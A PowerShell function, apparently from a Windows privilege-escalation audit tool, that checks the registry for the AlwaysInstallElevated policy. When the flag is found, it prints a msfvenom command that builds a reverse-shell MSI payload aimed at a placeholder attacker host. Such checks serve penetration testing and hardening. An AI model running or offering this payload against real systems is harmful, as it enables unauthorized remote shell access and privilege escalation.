Function CheckAlwaysInstallElevated {
    Write-Debug "### Checking if AlwaysInstallElevated flag is set..."
    $installerPath = "\SOFTWARE\Policies\Microsoft\Windows\Installer"
    $installerPathUsers = @()
    $vulnerable = $false
    
    try {
        $users = Get-ChildItem "REGISTRY::HKEY_USERS" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty "Name" | ForEach-Object { $_.Split("\",2)[1] }
        foreach ($user in $users) {
            $installerPathUsers += "REGISTRY::HKEY_USERS\" + $user + $installerPath
            Write-Debug "$user added to searchpaths"
        }
    }
    catch {} # There will be users we can not access, but doesn't matter

    try {
        $installerPropertiesHKLM = Get-ItemProperty -Path "HKLM:\$installerPath" -ErrorAction SilentlyContinue
        if ( $installerPropertiesHKLM.AlwaysInstallElevated -eq 1 ) {
            Write-Host -ForegroundColor Red "Always install elevated activated for Machine!"
            Write-Host -ForegroundColor DarkCyan "Verify via:"
            Write-Host -ForegroundColor DarkCyan "Get-ItemProperty -Path 'HKLM:\$installerPath'"
            $vulnerable = $true
        }

        foreach ($installerPathUser in $installerPathUsers) {
            $installerPropertiesUser = Get-ItemProperty -Path "$installerPathUser" -ErrorAction SilentlyContinue
            if ( $installerPropertiesUser.AlwaysInstallElevated -eq 1 ) {
                Write-Host -ForegroundColor Red "Always install elevated activated for $installerPathUser`:"
                Write-Host $installerPropertiesUser
                Write-Host -ForegroundColor DarkCyan "Verify via:"
                Write-Host -ForegroundColor DarkCyan "Get-ItemProperty -Path '$installerPathUser'"
                $vulnerable = $true
            }
        }
    }
    catch {
        Write-Host "Something went wrong: $_"
        Write-Host "Continuing."
    }

    if ( $vulnerable ) {
        Write-Host -ForegroundColor Yellow "Use msfvenom to exploit:"
        Write-Host -ForegroundColor Yellow "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=443 -a x64 --platform Windows -f msi -o evil.msi"
    }
    else {
        Write-Debug "All good."
    }

}